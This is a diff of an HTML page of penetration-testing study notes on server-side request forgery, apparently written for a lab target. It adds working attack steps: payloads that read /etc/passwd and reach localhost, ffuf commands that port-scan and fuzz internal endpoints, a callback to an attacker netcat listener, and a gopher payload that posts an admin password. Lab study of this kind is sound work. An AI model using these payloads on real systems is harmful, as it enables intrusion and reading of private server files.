@@ -668,6 +668,15 @@
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
+  <a href="#identification" class="md-nav__link">
+    <span class="md-ellipsis">
+      Identification
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
   <a href="#exploitation" class="md-nav__link">
     <span class="md-ellipsis">
       Exploitation
@@ -1273,6 +1282,15 @@
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
+  <a href="#identification" class="md-nav__link">
+    <span class="md-ellipsis">
+      Identification
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
   <a href="#exploitation" class="md-nav__link">
     <span class="md-ellipsis">
       Exploitation
@@ -1421,16 +1439,41 @@
 
 <h1 id="server-side-attacks">Server-Side Attacks</h1>
 <h2 id="ssrf">SSRF</h2>
+<p><a href="https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/">OWASP SSRF Page</a></p>
+<h3 id="identification">Identification</h3>
+<p>Based on web app at http://10.129.201.127:34978 that has a drop down to check date availbility through a post parameter (<code>dateserver=http://dateserver.htb/availability.php&amp;date=2024-01-01</code>):</p>
+<ul>
+<li>Try pointing the post request to itself to see if the response reflects <code>dateserver=http://127.0.0.1/index.php&amp;date=2024-01-01</code></li>
+<li>Use burp to check post parameter for dynamically loaded content.</li>
+<li>Try changing the request to see if error infromation.</li>
+<li>Start a netcat listener and send a request in the post parameter to it i.e: <code>dateserver=http://10.10.15.145:8000/ssrf/&amp;date=2024-01-01</code>.</li>
+</ul>
 <h3 id="exploitation">Exploitation</h3>
 <ul>
-<li>internal portscan by accessing ports on localhost</li>
-<li>accessing restricted endpoints</li>
+<li>
+<p>Change POST parameter to <code>dateserver=file:///etc/passwd&amp;date=2024-01-01</code> to check for LFI.</p>
+</li>
+<li>
+<p>internal portscan by accessing ports on localhost:</p>
+</li>
 </ul>
+<pre><code class="language-bash">seq 1 10000 &gt; ports.txt
+ffuf -w ./ports.txt -u http://10.129.201.127/index.php -X POST -H &quot;Content-Type: application/x-www-form-urlencoded&quot; -d &quot;dateserver=http://127.0.0.1:FUZZ/&amp;date=2024-01-01&quot; -fr &quot;Failed to connect to&quot;
+</code></pre>
+<ul>
+<li>accessing restricted endpoints:</li>
+</ul>
+<pre><code class="language-bash">ffuf -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -u http://10.129.201.127/index.php -X POST -H &quot;Content-Type: application/x-www-form-urlencoded&quot; -d &quot;dateserver=http://dateserver.htb/FUZZ.php&amp;date=2024-01-01&quot; -fr &quot;Server at dateserver.htb Port 80&quot;
+</code></pre>
+<ul>
+<li>Consider we find and endpoint admin.php through fuzzing which returns a POST form:</li>
+</ul>
+<p><img alt="admin.php" src="../../images/admin_php.png" width="300" /></p>
 <h3 id="protocols">Protocols</h3>
 <ul>
-<li><code>http://127.0.0.1/</code></li>
-<li><code>file:///etc/passwd</code></li>
-<li><code>gopher://dateserver.htb:80/_POST%20/admin.php%20HTTP%2F1.1%0D%0AHost:%20dateserver.htb%0D%0AContent-Length:%2013%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Aadminpw%3Dadmin</code></li>
+<li><code>http://127.0.0.1/</code> or <code>https://</code> can be used to access internal or external endpoints</li>
+<li><code>file:///etc/passwd</code> can be used for local file inclusion</li>
+<li><code>gopher://dateserver.htb:80/_POST%20/admin.php%20HTTP%2F1.1%0D%0AHost:%20dateserver.htb%0D%0AContent-Length:%2013%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Aadminpw%3Dadmin</code> can be used to send arbitrary payloads with internal services</li>
 </ul>
 <h2 id="ssti">SSTI</h2>
 <h3 id="exploitation_1">Exploitation</h3>
